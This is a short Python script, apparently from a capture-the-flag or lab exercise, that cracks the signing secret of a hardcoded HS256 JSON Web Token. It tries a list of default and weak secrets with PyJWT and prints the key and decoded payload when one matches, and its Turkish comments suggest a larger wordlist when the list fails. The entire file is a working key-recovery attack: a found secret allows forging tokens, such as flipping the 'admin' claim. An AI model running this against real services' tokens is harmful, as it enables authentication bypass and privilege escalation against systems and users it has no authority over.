
import jwt

token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im1lcnZlIiwiYWRtaW4iOmZhbHNlfQ.uT8rAd3dr2a4Wqr3Lkx13E5zpgfa0LAKfVjUJUM2zXo"

# PyJWT readme / default / zayıf olası secret'lar (genişletilebilir)
candidates = [
    "secret",
    "SECRET_KEY",
    "changeme",
    "password",
    "admin",
    "jwtsecret",
    "your-256-bit-secret",
    "your-secret",
    "supersecret",
]

for key in candidates:
    try:
        data = jwt.decode(token, key, algorithms=["HS256"])
        print("[+] SECRET FOUND:", key)
        print("[+] DECODED:", data)
        break
    except Exception:
        pass
else:
    print("[-] Candidate list yetmedi. Daha büyük wordlist lazım.")



   


